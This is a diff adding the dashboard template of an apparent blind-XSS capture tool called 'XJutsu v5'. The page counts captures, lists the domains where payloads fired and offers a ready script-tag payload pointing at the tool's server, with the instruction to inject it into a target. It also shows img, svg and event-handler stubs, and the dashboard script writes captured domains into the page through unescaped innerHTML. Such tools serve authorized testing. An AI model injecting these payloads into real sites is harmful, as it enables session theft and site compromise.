@@ -1,0 +1,184 @@
+{% extends 'hunter/base.html' %}
+
+{% block title %}Dashboard - XJutsu v5{% endblock %}
+
+{% block content %}
+<div class="space-y-8">
+    <!-- Header -->
+    <div class="flex justify-between items-center">
+        <div>
+            <h1 class="text-3xl font-bold">Dashboard</h1>
+            <p class="text-gray-500 mt-1">Real-time XSS monitoring</p>
+        </div>
+        <div class="flex space-x-4">
+            <a href="{% url 'payload_create' %}" class="btn-primary px-6 py-2 rounded-lg font-semibold transition">
+                <i class="fas fa-plus mr-2"></i>New Payload
+            </a>
+        </div>
+    </div>
+    
+    <!-- Stats Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+        <div class="card rounded-xl p-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-500 text-sm">Total Captures</p>
+                    <p class="text-3xl font-bold mt-1">{{ total_captures }}</p>
+                </div>
+                <div class="w-12 h-12 bg-primary/20 rounded-xl flex items-center justify-center">
+                    <i class="fas fa-bullseye text-primary text-xl"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card rounded-xl p-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-500 text-sm">New Captures</p>
+                    <p class="text-3xl font-bold mt-1 text-green-500">{{ new_captures }}</p>
+                </div>
+                <div class="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center">
+                    <i class="fas fa-bell text-green-500 text-xl"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card rounded-xl p-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-500 text-sm">Active Payloads</p>
+                    <p class="text-3xl font-bold mt-1">{{ active_payloads }}</p>
+                </div>
+                <div class="w-12 h-12 bg-secondary/20 rounded-xl flex items-center justify-center">
+                    <i class="fas fa-code text-secondary text-xl"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card rounded-xl p-6">
+            <div class="flex items-center justify-between">
+                <div>
+                    <p class="text-gray-500 text-sm">Server Status</p>
+                    <p class="text-lg font-bold mt-1 flex items-center">
+                        <span class="w-2 h-2 bg-green-500 rounded-full mr-2 pulse-dot"></span>
+                        Online
+                    </p>
+                </div>
+                <div class="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center">
+                    <i class="fas fa-server text-green-500 text-xl"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Quick Payload -->
+    <div class="card rounded-xl p-6">
+        <h2 class="text-xl font-bold mb-4">
+            <i class="fas fa-bolt text-yellow-500 mr-2"></i>Quick Payload
+        </h2>
+        <p class="text-gray-500 mb-4">Copy and inject this into your target:</p>
+        
+        <div class="bg-dark-900 rounded-lg p-4 relative">
+            <code class="text-green-400 text-sm break-all" id="quickPayload">&lt;script src="{{ server_url }}/x.js"&gt;&lt;/script&gt;</code>
+            <button onclick="copyPayload()" class="absolute top-2 right-2 text-gray-400 hover:text-white transition">
+                <i class="fas fa-copy"></i>
+            </button>
+        </div>
+        
+        <div class="mt-4 grid grid-cols-3 gap-4">
+            <div class="bg-dark-900 rounded-lg p-3">
+                <p class="text-xs text-gray-500 mb-1">IMG Tag</p>
+                <code class="text-xs text-blue-400">&lt;img src=x onerror="..."&gt;</code>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-3">
+                <p class="text-xs text-gray-500 mb-1">SVG Tag</p>
+                <code class="text-xs text-blue-400">&lt;svg onload="..."&gt;</code>
+            </div>
+            <div class="bg-dark-900 rounded-lg p-3">
+                <p class="text-xs text-gray-500 mb-1">Event Handler</p>
+                <code class="text-xs text-blue-400">" onfocus="..." autofocus</code>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Recent Captures -->
+    <div class="card rounded-xl p-6">
+        <div class="flex justify-between items-center mb-6">
+            <h2 class="text-xl font-bold">
+                <i class="fas fa-history text-primary mr-2"></i>Recent Captures
+            </h2>
+            <a href="{% url 'captures_list' %}" class="text-primary hover:text-secondary transition">
+                View All <i class="fas fa-arrow-right ml-1"></i>
+            </a>
+        </div>
+        
+        <div class="space-y-4" id="capturesList">
+            {% for capture in recent_captures %}
+            <a href="{% url 'capture_detail' capture.id %}" class="block bg-dark-900 rounded-lg p-4 hover:bg-dark-700 transition">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center space-x-4">
+                        <div class="w-10 h-10 bg-primary/20 rounded-lg flex items-center justify-center">
+                            <i class="fas fa-crosshairs text-primary"></i>
+                        </div>
+                        <div>
+                            <p class="font-semibold truncate max-w-md">{{ capture.domain }}</p>
+                            <p class="text-sm text-gray-500 truncate max-w-md">{{ capture.uri }}</p>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <span class="status-{{ capture.status }} text-sm">
+                            <i class="fas fa-circle text-xs mr-1"></i>{{ capture.get_status_display }}
+                        </span>
+                        <p class="text-xs text-gray-500 mt-1">{{ capture.fired_at|timesince }} ago</p>
+                    </div>
+                </div>
+            </a>
+            {% empty %}
+            <div class="text-center py-12">
+                <i class="fas fa-ghost text-4xl text-gray-600 mb-4"></i>
+                <p class="text-gray-500">No captures yet. Deploy a payload to get started!</p>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+</div>
+
+<script>
+function copyPayload() {
+    const payload = document.getElementById('quickPayload').textContent;
+    navigator.clipboard.writeText(payload);
+    
+    // Show feedback
+    const btn = event.target;
+    btn.innerHTML = '<i class="fas fa-check text-green-500"></i>';
+    setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy"></i>';
+    }, 2000);
+}
+
+function updateDashboard(capture) {
+    const list = document.getElementById('capturesList');
+    const item = document.createElement('a');
+    item.href = '/captures/' + capture.id + '/';
+    item.className = 'block bg-dark-900 rounded-lg p-4 hover:bg-dark-700 transition border border-green-500';
+    item.innerHTML = `
+        <div class="flex items-center justify-between">
+            <div class="flex items-center space-x-4">
+                <div class="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center">
+                    <i class="fas fa-crosshairs text-green-500"></i>
+                </div>
+                <div>
+                    <p class="font-semibold">${capture.domain}</p>
+                    <p class="text-sm text-gray-500">${capture.uri}</p>
+                </div>
+            </div>
+            <div class="text-right">
+                <span class="status-new text-sm"><i class="fas fa-circle text-xs mr-1"></i>New</span>
+                <p class="text-xs text-gray-500 mt-1">Just now</p>
+            </div>
+        </div>
+    `;
+    list.insertBefore(item, list.firstChild);
+}
+</script>
+{% endblock %}
